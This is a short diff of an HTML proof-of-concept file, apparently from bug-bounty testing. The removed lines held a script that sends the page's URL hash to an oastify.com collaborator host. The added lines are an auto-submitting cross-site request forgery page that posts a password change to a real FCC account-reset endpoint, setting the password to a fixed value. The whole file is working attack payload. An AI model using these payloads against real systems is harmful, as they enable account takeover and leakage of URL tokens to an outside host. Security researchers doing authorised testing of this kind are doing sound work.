@@ -1,4 +1,16 @@
-<script>
-  document.write("<h1>Logging URL...</h1>");
-  fetch("https://sws2d9n4d7xpn2xdq0ofmm8n3e95xyln.oastify.com/log?hash=" + encodeURIComponent(window.location.hash));
-</script>
+<html>
+  <body>
+    <form action="https://apps2.fcc.gov/fccUserReg/pages/profile-reset-passwd.htm" method="POST">
+      <input type="hidden" name="frm-updatePwd" value="frm-updatePwd">
+      <input type="hidden" name="frm-updatePwd%3Apassword" value="TESTing1234.">
+      <input type="hidden" name="frm-updatePwd%3Arepassword" value="TESTing1234.">
+      <input type="hidden" name="frm-updatePwd%3Avalidator" value="validator">
+      <input type="hidden" name="frm-updatePwd%3AsaveChanges" value="Update Password">
+      <input type="hidden" name="javax.faces.ViewState" value="j_id14%3Aj_id15">
+      <input type="submit" value="Submit CSRF">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
